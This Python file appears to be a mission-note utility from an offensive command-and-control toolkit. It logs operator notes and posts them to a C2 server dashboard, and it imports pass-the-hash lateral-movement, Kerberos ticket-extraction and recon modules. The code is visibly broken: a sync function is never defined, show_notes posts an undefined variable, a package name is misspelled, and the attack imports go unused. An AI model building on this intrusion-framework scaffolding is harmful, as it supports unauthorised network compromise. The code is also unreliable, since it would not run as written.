"""
Note Console - Professor&Master Memorable
Operator-agent live chat, mission notes, tagging, and dashboard sync.
"""
import datetime
from config import C2_URL, OPERATOR_ID
import requests
from cp_opereatorex.comms.comlink_ai import ComLinkAI
from core.opsec.anomaly_watchdog import AnomalyWatchdog
from core.ai.ai_task_suggest import suggest_tasks
from core.lateral.pass_the_hash import automate_lateral_movement
from core.lateral.kerberos_probe import extract_kerberos_tickets
from core.recon.recon_ai import passive_recon

def add_note(note, author="operator", tag=None, sync=True):
    ts = datetime.datetime.now().isoformat()
    tag_str = f"[{tag}]" if tag else ""
    entry = f"[{ts}] {author}{tag_str}: {note}\n"
    with open("mission_notes.txt", "a", encoding="utf-8") as f:
        f.write(entry)
    log_event(f"Note added by {author}{tag_str}")
    if sync:
        sync_note_dashboard(entry)

def show_notes(filter_tag=None):
    try:
        with open("mission_notes.txt", "r", encoding="utf-8") as f:
            notes = f.readlines()
        if filter_tag:
            notes = [n for n in notes if f"[{filter_tag}]" in n]
        print("".join(notes) if notes else "No notes yet.")
        requests.post(f"{C2_URL}/dashboard/notes", data={"note": note, "operator": OPERATOR_ID})
    except Exception:
        pass

def log_event(msg):
    with open("agent.log", "a") as f:
        f.write(f"[{datetime.datetime.now().isoformat()}] {msg}\n")

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        tag = None
        if "--tag" in sys.argv:
            idx = sys.argv.index("--tag")
            tag = sys.argv[idx + 1] if idx + 1 < len(sys.argv) else None
            note = " ".join([w for i, w in enumerate(sys.argv[1:]) if i != idx - 1 and i != idx])
        else:
            note = " ".join(sys.argv[1:])
        add_note(note, author=OPERATOR_ID, tag=tag)
    else:
        show_notes()